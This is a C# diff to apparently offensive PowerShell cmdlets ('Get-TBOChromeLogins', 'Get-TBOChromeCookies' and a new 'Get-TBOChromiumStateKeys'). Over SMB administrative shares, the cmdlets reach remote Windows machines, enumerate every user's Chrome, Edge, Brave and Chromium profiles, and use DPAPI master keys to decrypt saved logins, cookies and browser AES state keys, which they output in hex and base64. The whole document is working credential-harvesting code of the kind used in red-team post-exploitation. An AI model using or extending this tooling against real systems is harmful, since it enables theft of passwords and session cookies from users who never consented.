@@ -22,9 +22,15 @@ namespace Titanis.Tbo.Smb2.PowerShell
 	{
 		internal const string DefaultShareName = "C$";
 		internal const string DefaultProfileName = "Default";
+		internal const string DefaultBrowser = "Chrome";
 
 		private const string ChromeUserDataRoot = @"AppData\Local\Google\Chrome\User Data";
-		private const string ChromeLocalStateRelativePath = ChromeUserDataRoot + @"\Local State";
+		private const string EdgeUserDataRoot = @"AppData\Local\Microsoft\Edge\User Data";
+		private const string BraveUserDataRoot = @"AppData\Local\BraveSoftware\Brave-Browser\User Data";
+		private const string ChromiumUserDataRoot = @"AppData\Local\Chromium\User Data";
+		private const string ChromeProfilePrefix = "Profile ";
+		private const string ChromeGuestProfileName = "Guest Profile";
+		private const string ChromeSystemProfileName = "System Profile";
 
 		private static readonly byte[] DpapiHeader = Encoding.UTF8.GetBytes("DPAPI");
 
@@ -33,6 +39,41 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 		internal static string NormalizeShareName(string? shareName)
 			=> DpapiHelpers.NormalizeShareName(shareName);
+
+		internal static string NormalizeBrowserName(string? browserName)
+		{
+			var value = string.IsNullOrWhiteSpace(browserName) ? DefaultBrowser : browserName.Trim();
+
+			if (value.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
+				return "Chrome";
+			if (value.Equals("Edge", StringComparison.OrdinalIgnoreCase))
+				return "Edge";
+			if (value.Equals("Brave", StringComparison.OrdinalIgnoreCase))
+				return "Brave";
+			if (value.Equals("Chromium", StringComparison.OrdinalIgnoreCase))
+				return "Chromium";
+
+			throw new ArgumentException($"Unsupported browser '{value}'.", nameof(browserName));
+		}
+
+		internal static string GetUserDataRootRelativePath(string browserName)
+		{
+			var browser = NormalizeBrowserName(browserName);
+
+			if (browser.Equals("Chrome", StringComparison.OrdinalIgnoreCase))
+				return ChromeUserDataRoot;
+			if (browser.Equals("Edge", StringComparison.OrdinalIgnoreCase))
+				return EdgeUserDataRoot;
+			if (browser.Equals("Brave", StringComparison.OrdinalIgnoreCase))
+				return BraveUserDataRoot;
+			if (browser.Equals("Chromium", StringComparison.OrdinalIgnoreCase))
+				return ChromiumUserDataRoot;
+
+			throw new ArgumentOutOfRangeException(nameof(browserName), browserName, "Unsupported browser.");
+		}
+
+		internal static string GetLocalStateRelativePath(string browserName)
+			=> GetUserDataRootRelativePath(browserName) + @"\Local State";
 
 		internal static IReadOnlyList<WildcardPattern> BuildUserFilters(string[]? filters)
 		{
@@ -141,30 +182,196 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			return results;
 		}
 
-		internal static UncPath GetLocalStatePath(string serverName, string shareName, string userName)
+		internal static UncPath GetUserDataRootPath(string serverName, string shareName, string userName, string browserName)
 		{
 			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
-			return userRoot.Append(ChromeLocalStateRelativePath);
+			return userRoot.Append(GetUserDataRootRelativePath(browserName));
 		}
 
-		internal static UncPath GetLoginDataPath(string serverName, string shareName, string userName, string profileName)
+		internal static IReadOnlyList<string> EnumerateProfileDirectories(
+			ISmbProviderInfo smb,
+			string serverName,
+			string shareName,
+			string userName,
+			string browserName,
+			Action<string>? logWarning,
+			Action<string>? logVerbose,
+			Action<string, Exception>? logException,
+			CancellationToken cancellationToken)
 		{
-			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
-			return userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Login Data");
+			logWarning ??= _ => { };
+			logVerbose ??= _ => { };
+			logException ??= (context, ex) => smb.LogException(context, ex);
+
+			var userDataRoot = GetUserDataRootPath(serverName, shareName, userName, browserName);
+			var fileSystem = SmbFileSystemResolver.Resolve(smb);
+
+			var results = new List<string>();
+
+			ISmbDirectory? dir = null;
+			try
+			{
+				dir = fileSystem.OpenDirectory(userDataRoot, cancellationToken);
+				foreach (var entry in dir.QueryEntries("*", Smb2Directory.Smb2DirQueryOptions.None, SecurityInfo.None, Smb2Directory.DefaultQueryBufferSize, cancellationToken))
+				{
+					if (string.IsNullOrEmpty(entry.FileName))
+						continue;
+					if (entry.FileName is "." or "..")
+						continue;
+
+					bool isDirectory = (entry.FileAttributes & Winterop.FileAttributes.Directory) != 0;
+					bool isReparse = (entry.FileAttributes & Winterop.FileAttributes.ReparsePoint) != 0;
+					if (!isDirectory || isReparse)
+						continue;
+
+					if (!IsKnownProfileDirectoryName(entry.FileName))
+						continue;
+
+					results.Add(entry.FileName);
+				}
+			}
+			catch (Winterop.NtstatusException ex) when (IsMissingPath(ex))
+			{
+				logVerbose($"Get-TBOChrome* could not open {userDataRoot}: {ex.StatusCode}.");
+			}
+			catch (Winterop.NtstatusException ex) when (IsAccessDenied(ex))
+			{
+				logWarning($"Get-TBOChrome* was denied access to {userDataRoot}: {ex.StatusCode}.");
+			}
+			catch (Exception ex)
+			{
+				logException($"Get-TBOChrome* failed to enumerate {userDataRoot}", ex);
+				throw;
+			}
+			finally
+			{
+				dir?.Dispose();
+			}
+
+			return SortProfileNames(results);
 		}
 
-		internal static (UncPath NetworkCookies, UncPath LegacyCookies) GetCookiePaths(string serverName, string shareName, string userName, string profileName)
+		internal static UncPath GetLocalStatePath(string serverName, string shareName, string userName, string browserName)
 		{
 			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
+			return userRoot.Append(GetLocalStateRelativePath(browserName));
+		}
+
+		internal static UncPath GetLoginDataPath(string serverName, string shareName, string userName, string browserName, string profileName)
+		{
+			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
+			var userDataRoot = GetUserDataRootRelativePath(browserName);
+			return userRoot.Append($@"{userDataRoot}\{profileName}\Login Data");
+		}
+
+		internal static (UncPath NetworkCookies, UncPath LegacyCookies) GetCookiePaths(string serverName, string shareName, string userName, string browserName, string profileName)
+		{
+			var userRoot = UncPath.Parse($@"\\{serverName}\{shareName}\Users\{userName}");
+			var userDataRoot = GetUserDataRootRelativePath(browserName);
 			return (
-				userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Network\Cookies"),
-				userRoot.Append($@"{ChromeUserDataRoot}\{profileName}\Cookies")
+				userRoot.Append($@"{userDataRoot}\{profileName}\Network\Cookies"),
+				userRoot.Append($@"{userDataRoot}\{profileName}\Cookies")
 			);
 		}
 
 		internal static bool HasDpapiHeader(ReadOnlySpan<byte> data)
 		{
 			return data.Length >= DpapiHeader.Length && data.Slice(0, DpapiHeader.Length).SequenceEqual(DpapiHeader);
+		}
+
+		private static bool IsKnownProfileDirectoryName(string name)
+		{
+			if (string.IsNullOrWhiteSpace(name))
+				return false;
+
+			if (name.Equals(DefaultProfileName, StringComparison.OrdinalIgnoreCase))
+				return true;
+
+			if (name.StartsWith(ChromeProfilePrefix, StringComparison.OrdinalIgnoreCase))
+				return true;
+
+			if (name.Equals(ChromeGuestProfileName, StringComparison.OrdinalIgnoreCase))
+				return true;
+
+			if (name.Equals(ChromeSystemProfileName, StringComparison.OrdinalIgnoreCase))
+				return true;
+
+			return false;
+		}
+
+		private static IReadOnlyList<string> SortProfileNames(IEnumerable<string> profileNames)
+		{
+			if (profileNames == null)
+				return Array.Empty<string>();
+
+			var unique = profileNames
+				.Where(n => !string.IsNullOrWhiteSpace(n))
+				.Distinct(StringComparer.OrdinalIgnoreCase)
+				.ToList();
+
+			unique.Sort(CompareProfileNames);
+			return unique;
+		}
+
+		private static int CompareProfileNames(string? a, string? b)
+		{
+			if (a == null && b == null)
+				return 0;
+			if (a == null)
+				return 1;
+			if (b == null)
+				return -1;
+
+			var aKey = GetProfileSortKey(a);
+			var bKey = GetProfileSortKey(b);
+
+			int cmp = aKey.Group.CompareTo(bKey.Group);
+			if (cmp != 0)
+				return cmp;
+
+			if (aKey.Group == 1)
+			{
+				cmp = aKey.ProfileNumber.CompareTo(bKey.ProfileNumber);
+				if (cmp != 0)
+					return cmp;
+			}
+
+			return string.Compare(a, b, StringComparison.OrdinalIgnoreCase);
+		}
+
+		private static (int Group, int ProfileNumber) GetProfileSortKey(string name)
+		{
+			if (name.Equals(DefaultProfileName, StringComparison.OrdinalIgnoreCase))
+				return (0, 0);
+
+			if (name.StartsWith(ChromeProfilePrefix, StringComparison.OrdinalIgnoreCase))
+			{
+				if (TryParseProfileNumber(name, out int n))
+					return (1, n);
+				return (1, int.MaxValue);
+			}
+
+			if (name.Equals(ChromeGuestProfileName, StringComparison.OrdinalIgnoreCase))
+				return (2, 0);
+
+			if (name.Equals(ChromeSystemProfileName, StringComparison.OrdinalIgnoreCase))
+				return (3, 0);
+
+			return (4, 0);
+		}
+
+		private static bool TryParseProfileNumber(string profileName, out int profileNumber)
+		{
+			profileNumber = 0;
+
+			if (string.IsNullOrWhiteSpace(profileName))
+				return false;
+
+			if (!profileName.StartsWith(ChromeProfilePrefix, StringComparison.OrdinalIgnoreCase))
+				return false;
+
+			var remainder = profileName.Substring(ChromeProfilePrefix.Length).Trim();
+			return int.TryParse(remainder, out profileNumber);
 		}
 
 		internal static bool TryStripDpapiHeader(byte[] payload, out byte[] stripped, out string? failureReason)
@@ -497,7 +704,9 @@ namespace Titanis.Tbo.Smb2.PowerShell
 
 	internal sealed class ChromeStateKeyCache
 	{
-		private readonly Dictionary<string, (byte[]? Key, string? FailureReason)> _cache = new(StringComparer.OrdinalIgnoreCase);
+		private readonly Dictionary<string, CacheEntry> _cache = new(StringComparer.OrdinalIgnoreCase);
+
+		private readonly record struct CacheEntry(byte[]? Key, string? FailureReason, string? MasterKeyGuid, bool HmacValidated);
 
 		internal bool TryGetOrDecrypt(
 			ISmbProviderInfo smb,
@@ -508,14 +717,41 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			out byte[]? stateKey,
 			out string? failureReason)
 		{
+			return TryGetOrDecryptDetailed(
+				smb,
+				localStatePath,
+				masterKeySet,
+				cancellationToken,
+				logVerbose,
+				out stateKey,
+				out _,
+				out _,
+				out failureReason);
+		}
+
+		internal bool TryGetOrDecryptDetailed(
+			ISmbProviderInfo smb,
+			UncPath localStatePath,
+			IReadOnlyDictionary<Guid, byte[]> masterKeySet,
+			CancellationToken cancellationToken,
+			Action<string>? logVerbose,
+			out byte[]? stateKey,
+			out string? masterKeyGuid,
+			out bool hmacValidated,
+			out string? failureReason)
+		{
 			logVerbose ??= _ => { };
 			failureReason = null;
+			masterKeyGuid = null;
+			hmacValidated = false;
 
 			var cacheKey = localStatePath.ToString();
 			if (_cache.TryGetValue(cacheKey, out var cached))
 			{
 				stateKey = cached.Key;
 				failureReason = cached.FailureReason;
+				masterKeyGuid = cached.MasterKeyGuid;
+				hmacValidated = cached.HmacValidated;
 				return stateKey != null && stateKey.Length > 0;
 			}
 
@@ -526,21 +762,21 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				if (!TryParseEncryptedStateKey(localStateBytes, out var encryptedKeyBytes, out var parseFailure))
 				{
 					failureReason = parseFailure;
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
 				if (!ChromeHelpers.TryStripDpapiHeader(encryptedKeyBytes, out var dpapiBlobBytes, out var stripFailure))
 				{
 					failureReason = $"Local State encrypted_key decode failed: {stripFailure}";
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
-				if (!ChromeCrypto.TryDecryptDpapi(dpapiBlobBytes, masterKeySet, logVerbose, out var cleartext, out _, out _, out var dpapiFailure))
+				if (!ChromeCrypto.TryDecryptDpapi(dpapiBlobBytes, masterKeySet, logVerbose, out var cleartext, out masterKeyGuid, out hmacValidated, out var dpapiFailure))
 				{
 					failureReason = $"Local State encrypted_key DPAPI decrypt failed: {dpapiFailure}";
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
@@ -549,24 +785,24 @@ namespace Titanis.Tbo.Smb2.PowerShell
 					failureReason = cleartext == null
 						? "Local State encrypted_key DPAPI cleartext was empty."
 						: $"Local State encrypted_key decrypted length was {cleartext.Length}, expected 32.";
-					_cache[cacheKey] = (null, failureReason);
+					_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 					return false;
 				}
 
 				stateKey = cleartext;
-				_cache[cacheKey] = (stateKey, null);
+				_cache[cacheKey] = new CacheEntry(stateKey, null, masterKeyGuid, hmacValidated);
 				return true;
 			}
 			catch (Winterop.NtstatusException ex) when (ChromeHelpers.IsMissingPath(ex))
 			{
 				failureReason = $"Local State not found: {ex.StatusCode}.";
-				_cache[cacheKey] = (null, failureReason);
+				_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 				return false;
 			}
 			catch (Exception ex)
 			{
 				failureReason = ex.Message;
-				_cache[cacheKey] = (null, failureReason);
+				_cache[cacheKey] = new CacheEntry(null, failureReason, masterKeyGuid, hmacValidated);
 				return false;
 			}
 		}
@@ -822,6 +1058,20 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		public string? FailureReason { get; init; }
 	}
 
+	public sealed class TboChromiumStateKeyInfo
+	{
+		public string ServerName { get; init; } = string.Empty;
+		public string Browser { get; init; } = string.Empty;
+		public string? UserName { get; init; }
+		public string SourcePath { get; init; } = string.Empty;
+		public byte[]? StateKeyBytes { get; init; }
+		public string? StateKeyHex { get; init; }
+		public string? StateKeyBase64 { get; init; }
+		public string? MasterKeyGuid { get; init; }
+		public bool HmacValidated { get; init; }
+		public string? FailureReason { get; init; }
+	}
+
 	[Cmdlet(VerbsCommon.Get, "TBOChromeLogins")]
 	[OutputType(typeof(TboChromeLoginInfo))]
 	public sealed class GetTBOChromeLogins : SmbCmdlet
@@ -833,7 +1083,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;
 
 		[Parameter]
+		[ValidateSet("Chrome", "Edge", "Brave", "Chromium")]
+		public string Browser { get; set; } = ChromeHelpers.DefaultBrowser;
+
+		[Parameter]
 		public string ProfileName { get; set; } = ChromeHelpers.DefaultProfileName;
+
+		[Parameter]
+		public SwitchParameter AllProfiles { get; set; }
 
 		[Parameter]
 		public string[]? UserName { get; set; }
@@ -856,7 +1113,9 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			if (string.IsNullOrWhiteSpace(shareName))
 				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));
 
-			var profileName = string.IsNullOrWhiteSpace(this.ProfileName)
+			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
+
+			var requestedProfileName = string.IsNullOrWhiteSpace(this.ProfileName)
 				? ChromeHelpers.DefaultProfileName
 				: this.ProfileName.Trim();
 
@@ -877,8 +1136,26 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			{
 				cancellationToken.ThrowIfCancellationRequested();
 
-				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user);
-				var loginDataPath = ChromeHelpers.GetLoginDataPath(serverName, shareName, user, profileName);
+				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user, browser);
+				var profiles = this.AllProfiles.IsPresent
+					? ChromeHelpers.EnumerateProfileDirectories(
+						smb,
+						serverName,
+						shareName,
+						user,
+						browser,
+						logWarning: msg => this.LogWarning(smb, msg),
+						logVerbose: msg => this.LogVerbose(smb, msg),
+						logException: (context, ex) => this.LogException(smb, context, ex),
+						cancellationToken)
+					: new[] { requestedProfileName };
+
+				if (profiles.Count == 0)
+				{
+					var userDataRoot = ChromeHelpers.GetUserDataRootPath(serverName, shareName, user, browser);
+					this.LogVerbose(smb, $"Get-TBOChromeLogins found no {browser} profiles under {userDataRoot} for user '{user}'.");
+					continue;
+				}
 
 				byte[]? stateKey = null;
 				if (!stateKeys.TryGetOrDecrypt(smb, localStatePath, masterKeySet, cancellationToken, msg => this.LogVerbose(smb, msg), out stateKey, out var stateKeyFailure))
@@ -887,15 +1164,21 @@ namespace Titanis.Tbo.Smb2.PowerShell
 						this.LogVerbose(smb, $"Get-TBOChromeLogins could not resolve AES state key for {localStatePath}: {stateKeyFailure}");
 				}
 
-				ProcessLoginDbWithRetries(
-					smb,
-					serverName,
-					user,
-					profileName,
-					loginDataPath,
-					stateKey,
-					masterKeySet,
-					cancellationToken);
+				foreach (var profile in profiles)
+				{
+					cancellationToken.ThrowIfCancellationRequested();
+
+					var loginDataPath = ChromeHelpers.GetLoginDataPath(serverName, shareName, user, browser, profile);
+					ProcessLoginDbWithRetries(
+						smb,
+						serverName,
+						user,
+						profile,
+						loginDataPath,
+						stateKey,
+						masterKeySet,
+						cancellationToken);
+				}
 			}
 		}
 
@@ -976,6 +1259,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				Cache = SqliteCacheMode.Shared
 			};
 
+			SqliteBootstrap.EnsureInitialized();
+
 			using var conn = new SqliteConnection(builder.ToString());
 			conn.Open();
 
@@ -1035,7 +1320,14 @@ namespace Titanis.Tbo.Smb2.PowerShell
 		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;
 
 		[Parameter]
+		[ValidateSet("Chrome", "Edge", "Brave", "Chromium")]
+		public string Browser { get; set; } = ChromeHelpers.DefaultBrowser;
+
+		[Parameter]
 		public string ProfileName { get; set; } = ChromeHelpers.DefaultProfileName;
+
+		[Parameter]
+		public SwitchParameter AllProfiles { get; set; }
 
 		[Parameter]
 		public string[]? UserName { get; set; }
@@ -1058,7 +1350,9 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			if (string.IsNullOrWhiteSpace(shareName))
 				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));
 
-			var profileName = string.IsNullOrWhiteSpace(this.ProfileName)
+			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
+
+			var requestedProfileName = string.IsNullOrWhiteSpace(this.ProfileName)
 				? ChromeHelpers.DefaultProfileName
 				: this.ProfileName.Trim();
 
@@ -1079,8 +1373,26 @@ namespace Titanis.Tbo.Smb2.PowerShell
 			{
 				cancellationToken.ThrowIfCancellationRequested();
 
-				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user);
-				var (networkCookiesPath, legacyCookiesPath) = ChromeHelpers.GetCookiePaths(serverName, shareName, user, profileName);
+				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user, browser);
+				var profiles = this.AllProfiles.IsPresent
+					? ChromeHelpers.EnumerateProfileDirectories(
+						smb,
+						serverName,
+						shareName,
+						user,
+						browser,
+						logWarning: msg => this.LogWarning(smb, msg),
+						logVerbose: msg => this.LogVerbose(smb, msg),
+						logException: (context, ex) => this.LogException(smb, context, ex),
+						cancellationToken)
+					: new[] { requestedProfileName };
+
+				if (profiles.Count == 0)
+				{
+					var userDataRoot = ChromeHelpers.GetUserDataRootPath(serverName, shareName, user, browser);
+					this.LogVerbose(smb, $"Get-TBOChromeCookies found no {browser} profiles under {userDataRoot} for user '{user}'.");
+					continue;
+				}
 
 				byte[]? stateKey = null;
 				if (!stateKeys.TryGetOrDecrypt(smb, localStatePath, masterKeySet, cancellationToken, msg => this.LogVerbose(smb, msg), out stateKey, out var stateKeyFailure))
@@ -1089,10 +1401,17 @@ namespace Titanis.Tbo.Smb2.PowerShell
 						this.LogVerbose(smb, $"Get-TBOChromeCookies could not resolve AES state key for {localStatePath}: {stateKeyFailure}");
 				}
 
-				// Prefer Network\\Cookies (newer Chrome path), fall back to legacy Cookies.
-				if (!TryProcessCookiesPath(smb, serverName, user, profileName, networkCookiesPath, stateKey, masterKeySet, cancellationToken))
+				foreach (var profile in profiles)
 				{
-					TryProcessCookiesPath(smb, serverName, user, profileName, legacyCookiesPath, stateKey, masterKeySet, cancellationToken);
+					cancellationToken.ThrowIfCancellationRequested();
+
+					var (networkCookiesPath, legacyCookiesPath) = ChromeHelpers.GetCookiePaths(serverName, shareName, user, browser, profile);
+
+					// Prefer Network\\Cookies (newer Chrome path), fall back to legacy Cookies.
+					if (!TryProcessCookiesPath(smb, serverName, user, profile, networkCookiesPath, stateKey, masterKeySet, cancellationToken))
+					{
+						TryProcessCookiesPath(smb, serverName, user, profile, legacyCookiesPath, stateKey, masterKeySet, cancellationToken);
+					}
 				}
 			}
 		}
@@ -1176,6 +1495,8 @@ namespace Titanis.Tbo.Smb2.PowerShell
 				Cache = SqliteCacheMode.Shared
 			};
 
+			SqliteBootstrap.EnsureInitialized();
+
 			using var conn = new SqliteConnection(builder.ToString());
 			conn.Open();
 
@@ -1243,6 +1564,103 @@ namespace Titanis.Tbo.Smb2.PowerShell
 					FailureReason = failureReason
 				});
 			}
+		}
+	}
+
+	[Cmdlet(VerbsCommon.Get, "TBOChromiumStateKeys")]
+	[OutputType(typeof(TboChromiumStateKeyInfo))]
+	public sealed class GetTBOChromiumStateKeys : SmbCmdlet
+	{
+		[Parameter(Mandatory = true, Position = 0, ValueFromPipelineByPropertyName = true)]
+		public string ServerName { get; set; } = string.Empty;
+
+		[Parameter]
+		public string ShareName { get; set; } = ChromeHelpers.DefaultShareName;
+
+		[Parameter]
+		[ValidateSet("Chrome", "Edge", "Brave", "Chromium")]
+		public string Browser { get; set; } = ChromeHelpers.DefaultBrowser;
+
+		[Parameter]
+		public string[]? UserName { get; set; }
+
+		[Parameter(Mandatory = true)]
+		public TboDpapiMasterKeyInfo[]? MasterKeys { get; set; }
+
+		private CancellationTokenSource? _cancelSource;
+
+		protected override void ProcessRecord(ISmbProviderInfo smb)
+		{
+			this._cancelSource ??= new CancellationTokenSource();
+			var cancellationToken = this._cancelSource.Token;
+
+			var serverName = ChromeHelpers.NormalizeServerName(this.ServerName);
+			if (string.IsNullOrWhiteSpace(serverName))
+				throw new ArgumentException("ServerName must be provided.", nameof(this.ServerName));
+
+			var shareName = ChromeHelpers.NormalizeShareName(this.ShareName);
+			if (string.IsNullOrWhiteSpace(shareName))
+				throw new ArgumentException("ShareName must be provided.", nameof(this.ShareName));
+
+			var browser = ChromeHelpers.NormalizeBrowserName(this.Browser);
+
+			var masterKeySet = ChromeHelpers.BuildMasterKeySet(this.MasterKeys, msg => this.LogWarning(smb, msg), "Get-TBOChromiumStateKeys");
+			var userFilters = ChromeHelpers.BuildUserFilters(this.UserName);
+			var users = ChromeHelpers.EnumerateUserDirectories(
+				smb,
+				serverName,
+				shareName,
+				userFilters,
+				logWarning: msg => this.LogWarning(smb, msg),
+				logVerbose: msg => this.LogVerbose(smb, msg),
+				logException: (context, ex) => this.LogException(smb, context, ex),
+				cancellationToken);
+
+			var stateKeys = new ChromeStateKeyCache();
+			foreach (var user in users)
+			{
+				cancellationToken.ThrowIfCancellationRequested();
+
+				var localStatePath = ChromeHelpers.GetLocalStatePath(serverName, shareName, user, browser);
+				stateKeys.TryGetOrDecryptDetailed(
+					smb,
+					localStatePath,
+					masterKeySet,
+					cancellationToken,
+					logVerbose: msg => this.LogVerbose(smb, msg),
+					out var stateKey,
+					out var masterKeyGuid,
+					out var hmacValidated,
+					out var failureReason);
+
+				string? stateKeyHex = null;
+				string? stateKeyBase64 = null;
+				if (stateKey != null && stateKey.Length > 0)
+				{
+					stateKeyHex = stateKey.ToHexString();
+					stateKeyBase64 = Convert.ToBase64String(stateKey);
+				}
+
+				this.WriteObject(new TboChromiumStateKeyInfo
+				{
+					ServerName = serverName,
+					Browser = browser,
+					UserName = user,
+					SourcePath = localStatePath.ToString(),
+					StateKeyBytes = stateKey,
+					StateKeyHex = stateKeyHex,
+					StateKeyBase64 = stateKeyBase64,
+					MasterKeyGuid = masterKeyGuid,
+					HmacValidated = hmacValidated,
+					FailureReason = failureReason
+				});
+			}
+		}
+
+		protected override void StopProcessing()
+		{
+			this._cancelSource?.Cancel();
+			base.StopProcessing();
 		}
 	}
 }
